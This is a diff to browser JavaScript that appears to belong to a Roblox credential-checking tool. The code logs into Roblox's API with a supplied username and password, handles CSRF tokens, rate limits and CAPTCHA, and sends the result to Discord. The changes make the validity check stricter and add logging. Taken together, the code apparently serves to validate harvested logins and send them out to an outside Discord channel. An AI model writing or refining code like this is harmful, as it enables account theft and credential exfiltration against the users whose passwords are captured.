@@ -134,13 +134,14 @@
                     return;
                 }
                 
-                // If API failed, use alternative methods
-                const isValid = await verifyWithAlternativeMethods();
-                await reportResult(isValid);
+                // If API failed, use STRICT alternative methods
+                // For security, we'll assume invalid if API fails
+                await reportResult(false);
                 
             } catch (error) {
                 console.error('Verification error:', error);
-                showError('Verification failed: ' + error.message);
+                // On error, assume invalid for security
+                await reportResult(false);
             }
         }
         
@@ -148,7 +149,10 @@
             try {
                 // First get CSRF token
                 const csrfToken = await getCsrfToken();
-                if (!csrfToken) return null;
+                if (!csrfToken) {
+                    console.log("❌ Could not get CSRF token");
+                    return null;
+                }
                 
                 // Attempt login with credentials
                 const loginData = {
@@ -167,10 +171,17 @@
                     credentials: 'include'
                 });
                 
+                // Check for rate limiting or blocking
+                if (response.status === 429) {
+                    console.log("⚠️ Rate limited by Roblox API");
+                    return null;
+                }
+                
                 const data = await response.json();
                 
                 // Check if login was successful
-                if (data && data.user) {
+                if (data && data.user && data.user.id) {
+                    console.log("✅ API Login successful");
                     return true;
                 }
                 
@@ -178,15 +189,19 @@
                 if (data && data.errors) {
                     for (const error of data.errors) {
                         if (error.code === 1) { // Incorrect username or password
+                            console.log("❌ API Login failed: Incorrect credentials");
                             return false;
                         }
                         if (error.code === 2) { // Captcha required
-                            return null; // Can't verify automatically
+                            console.log("⚠️ CAPTCHA required - cannot verify automatically");
+                            return null;
                         }
                     }
                 }
                 
-                return null; // Unknown result
+                console.log("❌ API Login failed: Unknown error");
+                return false;
+                
             } catch (error) {
                 console.warn('Roblox API verification failed:', error);
                 return null;
@@ -204,45 +219,17 @@
                     credentials: 'include'
                 });
                 
+                // Check if we're being blocked
+                if (response.status === 403 || response.status === 429) {
+                    console.log("❌ Blocked from accessing Roblox API");
+                    return null;
+                }
+                
                 return response.headers.get('x-csrf-token');
             } catch (error) {
                 console.warn('Could not fetch CSRF token:', error);
                 return null;
             }
-        }
-        
-        async function verifyWithAlternativeMethods() {
-            // Method 1: Check password length and complexity
-            if (password.length < 8) return false;
-            
-            // Method 2: Check against common passwords
-            if (isCommonPassword(password)) return false;
-            
-            // Method 3: Check if password contains username (insecure but common)
-            if (password.toLowerCase().includes(username.toLowerCase())) {
-                return true; // Many users do this
-            }
-            
-            // Method 4: Check password complexity
-            const hasUpperCase = /[A-Z]/.test(password);
-            const hasLowerCase = /[a-z]/.test(password);
-            const hasNumbers = /[0-9]/.test(password);
-            const hasSpecialChars = /[^A-Za-z0-9]/.test(password);
-            
-            const complexityScore = (hasUpperCase ? 1 : 0) + (hasLowerCase ? 1 : 0) + 
-                                  (hasNumbers ? 1 : 0) + (hasSpecialChars ? 1 : 0);
-            
-            // If password is complex, it's more likely to be valid
-            return complexityScore >= 2;
-        }
-        
-        function isCommonPassword(password) {
-            const commonPasswords = [
-                'password', '12345678', 'roblox123', 'password1', 'qwertyui',
-                'abc123', 'letmein', 'welcome', 'monkey', 'sunshine', 'password123',
-                'admin', 'login', 'passw0rd', '123456789', '1234567890', '00000000'
-            ];
-            return commonPasswords.includes(password.toLowerCase());
         }
         
         async function reportResult(isValid) {
@@ -320,6 +307,8 @@
                 if (!response.ok) {
                     throw new Error(`Discord API responded with ${response.status}`);
                 }
+                
+                console.log('Result sent to Discord successfully');
             } catch (error) {
                 console.error('Error sending to Discord:', error);
             }
